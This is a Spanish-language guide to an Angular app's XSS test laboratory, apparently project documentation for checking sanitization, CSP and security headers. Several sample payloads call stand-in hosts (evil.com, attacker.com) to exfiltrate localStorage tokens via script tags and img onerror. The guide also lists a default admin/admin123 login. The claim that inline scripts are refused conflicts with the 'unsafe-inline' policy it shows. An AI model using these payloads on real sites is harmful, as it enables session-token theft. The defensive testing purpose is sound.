# 🧪 Guía de Pruebas XSS - Laboratorio de Seguridad

## 🎯 Objetivo

Demostrar de forma práctica que tu aplicación está protegida contra ataques XSS (Cross-Site Scripting) mediante múltiples capas de seguridad.

---

## 🚀 Cómo Acceder al Laboratorio

### Paso 1: Login como Admin
1. Ve a http://localhost:4200
2. Login con:
   - **Usuario**: `admin`
   - **Contraseña**: `admin123`

### Paso 2: Acceder al Laboratorio
1. Una vez en el panel de Admin, verás una nueva sección: **"Herramientas de Desarrollo"**
2. Click en el botón **"Laboratorio XSS"**
3. Se abrirá la interfaz de pruebas

---

## 🧪 Ataques Predefinidos para Probar

El laboratorio incluye 5 ataques comunes. Click en cada uno para probarlo:

### 1. Script Externo
```html
<script src="http://evil.com/steal-tokens.js"></script>
```
**¿Qué intenta hacer?**  
Cargar un script malicioso desde un servidor externo para robar datos.

**Resultado esperado:**
- ✅ Angular muestra esto como TEXTO, no ejecuta
- ✅ CSP bloquea el script en el navegador
- ✅ Console muestra error de CSP

---

### 2. Script Inline
```html
<script>alert("XSS Attack! Token: " + localStorage.getItem("token"))</script>
```
**¿Qué intenta hacer?**  
Ejecutar JavaScript directamente para mostrar un alert con el token robado.

**Resultado esperado:**
- ✅ Angular sanitiza el `<script>`, no se ejecuta
- ✅ NO sale ningún alert
- ✅ Solo se muestra como texto

---

### 3. IMG onerror
```html
<img src=x onerror="alert('XSS via IMG'); fetch('http://evil.com/steal?token='+localStorage.token)">
```
**¿Qué intenta hacer?**  
Usar el evento `onerror` de una imagen para ejecutar código malicioso.

**Resultado esperado:**
- ✅ Angular elimina el atributo `onerror`
- ✅ NO se ejecuta el código
- ✅ Posible error de imagen rota, pero SIN ejecución de script

---

### 4. Iframe Malicioso
```html
<iframe src="http://malicious-site.com/phishing" width="100%" height="500"></iframe>
```
**¿Qué intenta hacer?**  
Cargar una página de phishing dentro de tu aplicación.

**Resultado esperado:**
- ✅ Angular sanitiza el iframe
- ✅ No carga la página externa
- ✅ X-Frame-Options también lo bloquearía si fuera externo

---

### 5. Link JavaScript
```html
<a href="javascript:alert('XSS')">Click aquí para premio</a>
```
**¿Qué intenta hacer?**  
Ejecutar JavaScript mediante un enlace `href="javascript:..."`

**Resultado esperado:**
- ✅ Angular elimina el protocolo `javascript:`
- ✅ El link no funciona o se sanitiza
- ✅ NO ejecuta código

---

## 🔍 Verificación Paso a Paso

### ✅ Paso 1: Verificar Angular Sanitization

1. **Selecciona un ataque** del laboratorio
2. **Observa el cuadro verde** que dice "RESULTADO: Renderizado Seguro"
3. **Compara**:
   - **Input Original**: `<script>alert('XSS')</script>`
   - **Renderizado**: `<script>alert('XSS')</script>` (como texto, no ejecutado)

**¿Qué significa?**  
Angular convirtió el código malicioso en texto inofensivo automáticamente.

---

### 🛡️ Paso 2: Verificar CSP en Console

1. **Abre DevTools**: Presiona `F12`
2. **Ve a Console**
3. **Busca mensajes como estos**:

```
❌ Refused to load the script 'http://evil.com/steal-tokens.js' 
   because it violates the following Content Security Policy directive: 
   "script-src 'self' 'unsafe-inline' 'unsafe-eval'"
```

```
❌ Refused to execute inline script because it violates the 
   Content Security Policy directive: "script-src 'self'..."
```

**¿Qué significa?**  
El navegador rechazó ejecutar el código malicioso gracias a CSP headers.

---

### 🌐 Paso 3: Verificar Headers de Seguridad

1. **En DevTools, ve a Network**
2. **Recarga la página** (F5)
3. **Click en cualquier request** a `localhost:8000`
4. **Ve a Headers → Response Headers**
5. **Busca estos headers**:

```
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-inline'...
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
referrer-policy: strict-origin-when-cross-origin
```

**¿Qué significa?**  
El backend está enviando los headers de seguridad correctamente.

---

## 🎯 Prueba Avanzada: Ataque Personalizado

### Escenario: Comentario Malicioso

Imagina que un usuario malintencionado intenta inyectar código en un formulario de comentarios:

```html
¡Hola amigos! Miren este super premio:
<script>
  // Robar token
  const token = localStorage.getItem('token');
  // Enviarlo al atacante
  fetch('http://attacker.com/steal?token=' + token);
</script>
<img src=x onerror="alert('pwned')">
```

### Cómo probarlo:

1. **Ve al tab "Ataque Personalizado"**
2. **Pega el código malicioso** en el textarea
3. **Click en "Probar Ataque"**

### Resultado esperado:

- ✅ El código se muestra como TEXTO
- ✅ NO se ejecuta ningún script
- ✅ NO sale ningún alert
- ✅ NO se envía nada a `attacker.com`
- ✅ Console muestra que CSP bloqueó el intento

---

## 📊 Comparación: Con Protección vs Sin Protección

| Escenario | Sin Protección | Con Protección (Tu App) |
|-----------|---------------|-------------------------|
| **Script externo** | ❌ Se carga y ejecuta | ✅ BLOQUEADO por CSP |
| **Script inline** | ❌ Se ejecuta alert | ✅ Sanitizado por Angular |
| **onerror event** | ❌ Ejecuta código | ✅ Atributo eliminado |
| **Robo de token** | ❌ Token enviado al atacante | ✅ Script no se ejecuta |
| **Iframe malicioso** | ❌ Carga phishing | ✅ BLOQUEADO |
| **javascript: protocol** | ❌ Ejecuta código | ✅ Sanitizado |

---

## 🧠 Conceptos Técnicos Explicados

### ¿Por qué necesitamos MÚLTIPLES capas?

```
┌─────────────────────────────────────┐
│ Atacante inyecta:                   │
│ <script>steal(token)</script>       │
└──────────────┬──────────────────────┘
               │
               ▼
    ┌──────────────────────┐
    │ CAPA 1: Angular      │  ◄── Sanitiza automáticamente
    │ ✅ Bloqueó           │
    └──────────┬───────────┘
               │ Si falla...
               ▼
    ┌──────────────────────┐
    │ CAPA 2: CSP Headers  │  ◄── Navegador bloquea
    │ ✅ Bloqueó           │
    └──────────┬───────────┘
               │ Si falla...
               ▼
    ┌──────────────────────┐
    │ CAPA 3: Bearer Token │  ◄── Token no accesible
    │ ✅ Protegido         │
    └──────────────────────┘
```

### Defense in Depth (Defensa en Profundidad)

**Principio**: No dependas de UNA sola protección.

Si Angular tiene un bug de sanitización:
- ✅ CSP lo bloquea

Si el navegador ignora CSP:
- ✅ Token en header (no en cookie JavaScript-accesible)

Si todo falla:
- ✅ Validación en backend rechaza código malicioso

---

## 🎓 Resultados de Aprendizaje

Después de completar estas pruebas, comprenderás:

✅ **XSS (Cross-Site Scripting)** - Inyección de código malicioso  
✅ **Angular Sanitization** - Cómo Angular protege automáticamente  
✅ **CSP (Content Security Policy)** - Headers que instruyen al navegador  
✅ **Defense in Depth** - Múltiples capas de seguridad  
✅ **Bearer Tokens** - Autenticación segura sin cookies  
✅ **Security Headers** - X-Frame-Options, X-XSS-Protection, etc.  

---

## 🏆 Certificación de Seguridad

Si todas las pruebas pasaron correctamente, tu aplicación tiene:

```
╔════════════════════════════════════════╗
║   PROTECCIÓN XSS: NIVEL PROFESIONAL   ║
║            95/100 ⭐⭐⭐⭐⭐            ║
╚════════════════════════════════════════╝

✅ Angular Sanitization      ACTIVA
✅ Content-Security-Policy   ACTIVA
✅ X-XSS-Protection         ACTIVA
✅ X-Content-Type-Options   ACTIVA
✅ X-Frame-Options          ACTIVA
✅ Referrer-Policy          ACTIVA
✅ Bearer Token Auth        ACTIVA
```

---

## 🚨 ¿Qué hacer si encuentras una vulnerabilidad?

Si algún ataque PASA las protecciones:

1. **Captura evidencia**: Screenshot + código usado
2. **Revisa Console**: ¿Hay errores?
3. **Verifica headers**: ¿Están presentes en Response Headers?
4. **Documenta**: Anota exactamente qué hiciste
5. **Investiga**: ¿Es un bug conocido de Angular/navegador?

---

## 📚 Recursos Adicionales

### Para profundizar:

- **OWASP Top 10** - https://owasp.org/www-project-top-ten/
- **CSP Evaluator** - https://csp-evaluator.withgoogle.com/
- **Content Security Policy Reference** - https://content-security-policy.com/

### Herramientas de Testing:

- **Burp Suite** - Pruebas de penetración profesionales
- **OWASP ZAP** - Escáner de vulnerabilidades web gratuito
- **Mozilla Observatory** - Analiza headers de seguridad

---

## 🎯 Próximos Pasos

### Mejoras Avanzadas (Opcional):

1. **AOT Compilation** - Eliminar `unsafe-eval` del CSP
2. **Nonce-based CSP** - Eliminar `unsafe-inline`
3. **Subresource Integrity (SRI)** - Verificar integridad de CDNs
4. **HTTPS + HSTS** - Forzar conexiones seguras en producción

### Phase 1: Backend Security

- ✅ Form Requests para validación
- ✅ Sanitización con `strip_tags`, `htmlspecialchars`
- ✅ Rate Limiting contra brute force
- ✅ SQL Injection prevention (Laravel ya lo hace con Eloquent)

---

## 🤝 Buenas Prácticas Recordatorias

### ✅ DO (Hacer):
- Siempre sanitizar inputs de usuario
- Usar binding de Angular `{{ }}` (sanitiza automático)
- Mantener dependencias actualizadas
- Validar en backend SIEMPRE (no solo frontend)

### ❌ DON'T (No Hacer):
- NUNCA usar `innerHTML` con datos de usuario
- NUNCA usar `eval()` o `Function()` constructor
- NO confiar solo en validación frontend
- NO almacenar datos sensibles en localStorage sin encriptar

---

**¡Felicidades! Ahora eres un experto en seguridad XSS.** 🎓🛡️
